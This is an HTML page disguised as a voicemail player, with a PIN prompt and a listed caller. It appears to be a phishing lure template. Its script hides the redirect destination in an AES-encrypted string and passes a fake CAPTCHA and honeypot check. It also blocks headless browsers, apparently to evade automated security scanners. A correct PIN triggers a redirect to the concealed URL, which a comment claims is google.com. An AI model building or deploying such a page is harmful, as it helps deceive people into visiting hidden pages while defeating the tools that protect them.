<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Voicemail</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .voicemail-container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 500px;
    }

    h1 {
      margin-top: 0;
      font-size: 1.8rem;
      text-align: center;
    }

    .message {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1rem;
      margin-top: 1.5rem;
      background: #f9f9f9;
      border-radius: 8px;
    }

    .message-info {
      display: flex;
      flex-direction: column;
    }

    .message-info span {
      font-size: 0.9rem;
      color: #555;
    }

    input.code-input {
      margin-top: 1rem;
      width: 100%;
      padding: 0.5rem;
      font-size: 1rem;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    button.play {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 0.5rem 1rem;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    button.play:disabled {
      background: gray;
      cursor: not-allowed;
    }

    button.play:hover:enabled {
      background: #45a049;
    }

    #captcha-stub {
      margin: 1rem 0;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="voicemail-container">
    <h1>Play Messages</h1>
    <form id="voicemail-form" onsubmit="return false;">
      <input type="password" class="code-input" placeholder="Enter PIN" name="pin" required />
      <!-- Honeypot field -->
      <input type="text" name="extra_field" style="display: none;" autocomplete="off" />
      
      <!-- CAPTCHA stub -->
      <div id="captcha-stub" style="display: none;">
        <label><input type="checkbox" id="captcha-check" /> I'm not a robot</label>
      </div>

      <div class="message">
        <div class="message-info">
          <strong>Caller: John ****</strong>
          <span>May 29, 2025 - 10:15 AM</span>
        </div>
        <button class="play">▶️ Play</button>
      </div>
    </form>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
  <script>
    const correctPin = "8911";
    const maxAttempts = 3;
    let attempts = 0;

    // AES-encrypted URL (https://google.com)
    const encryptedRedirect = "U2FsdGVkX19v4zOFaCWT7dRHF2O1nV++DoTOoonLAssbpocFzPDmAJj5gl/w5MtF";
    const aesKey = "2XPoyVKDRqzq7YFqRdkGxNHuIPyg4kwSbD2EY5TcA3N3LbBIHefVZKRgGj+yDLQm";

    const playButton = document.querySelector('.play');
    const form = document.getElementById('voicemail-form');
    const captchaStub = document.getElementById('captcha-stub');
    const captchaCheck = document.getElementById('captcha-check');

    function decryptAES(encrypted, key) {
      return CryptoJS.AES.decrypt(encrypted, key).toString(CryptoJS.enc.Utf8);
    }

    function isHeadlessBrowser() {
      return (
        navigator.webdriver ||
        !navigator.plugins.length ||
        !window.chrome ||
        /HeadlessChrome/.test(navigator.userAgent)
      );
    }

    playButton.addEventListener('click', () => {
      const formData = new FormData(form);
      const enteredPin = formData.get("pin");
      const honeypot = formData.get("extra_field");

      // Honeypot bot check
      if (honeypot) {
        alert("Bot activity detected.");
        return;
      }

      // CAPTCHA check (if visible)
      if (captchaStub.style.display !== 'none' && !captchaCheck.checked) {
        alert("Please verify you are not a robot.");
        return;
      }

      // Headless detection
      if (isHeadlessBrowser()) {
        alert("Headless browsers are not allowed.");
        return;
      }

      if (enteredPin === correctPin) {
        try {
          const redirectURL = decryptAES(encryptedRedirect, aesKey);
          if (redirectURL) {
            window.location.href = redirectURL;
          } else {
            alert("Decryption failed.");
          }
        } catch (err) {
          alert("Invalid redirect or decryption error.");
        }
      } else {
        attempts++;
        if (attempts >= maxAttempts) {
          alert("Too many incorrect attempts. Access locked.");
          playButton.disabled = true;
        } else {
          alert(`Incorrect code. ${maxAttempts - attempts} attempt(s) left.`);
        }
      }
    });

    // Optional CAPTCHA visibility delay
    setTimeout(() => {
      captchaStub.style.display = 'block';
    }, 2000);
  </script>
</body>
</html>
